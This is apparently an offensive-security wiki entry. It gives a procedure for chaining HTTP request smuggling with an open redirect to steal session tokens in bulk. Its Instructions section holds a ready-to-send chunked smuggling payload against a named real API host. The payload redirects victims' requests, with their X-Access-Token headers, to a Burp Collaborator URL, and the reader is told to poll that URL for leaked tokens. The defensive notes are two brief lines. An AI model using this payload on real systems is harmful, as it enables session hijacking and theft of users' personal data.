---
tags:
  - http-smuggling
  - open-redirect
  - token-theft
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/http-smuggling-with-redirect]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Use Alternate Authentication Material]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 0d4339f7-a600-4112-91d8-1f8528546258
created_at: '2025-12-13T09:01:26.164Z'
updated_at: '2025-12-13T09:01:26.164Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Use Alternate Authentication Material]]'
---
# Chain Smuggling with Open Redirect to Steal Tokens

## Summary

This procedure chains HTTP Request Smuggling with an open redirect vulnerability to force victim requests to an attacker-controlled URL, leaking session tokens like X-Access-Token.

## Description

The smuggled request triggers a 301 redirect from the backend to an arbitrary HTTPS URL, bypassing frontend checks and sending victim headers to Burp Collaborator for bulk theft.

## Requirements

1. Burp Suite and Collaborator for request crafting and logging
2. Valid Collaborator URL
3. Exploitable smuggling vulnerability

## Defense

Defensive measures and detection strategies:

- Validate and filter redirect destinations
- Monitor for unexpected 301 redirects to external domains

## Objectives

1. Trigger open redirect via smuggling
2. Steal victim tokens in bulk
3. Collect PII-enabling data

## Instructions

### Step 1: Send Chained Payload

**Context**: Smuggle request to force redirect.

**Command** ([[commands/http-smuggling-with-redirect]]):
```http
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7
0

GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1
X: X
```

> Poll Collaborator for leaked tokens.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Use Alternate Authentication Material]]

### Sub-Techniques



## Commands Used

- [[commands/http-smuggling-with-redirect]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/Burp-Collaborator]]

## Tags

- [[http-smuggling]]
- [[open-redirect]]
- [[token-theft]]
